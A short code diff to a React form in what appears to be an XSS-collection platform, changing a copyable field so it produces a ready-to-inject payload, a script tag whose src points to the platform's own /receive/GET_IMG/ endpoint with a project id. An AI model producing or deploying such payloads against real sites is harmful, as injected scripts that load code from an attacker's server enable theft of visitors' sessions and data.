@@ -121,7 +121,7 @@ var Update_XSS_projects_Form = React.createClass({
                             dom.select(); //选择对象 
                             document.execCommand("Copy"); //执行浏览器复制命令
                             message.success("复制成功")
-                        } } rows={2} onChange={()=>{}} value={location.origin + "/receive/GET_XSS_JS/" + obj.uuid}></Input>
+                        } } rows={2} onChange={()=>{}} value={"<script src='"+location.origin + "/receive/GET_IMG/" + obj.uuid+"'></script>"}></Input>
 
 
                     </FormItem>
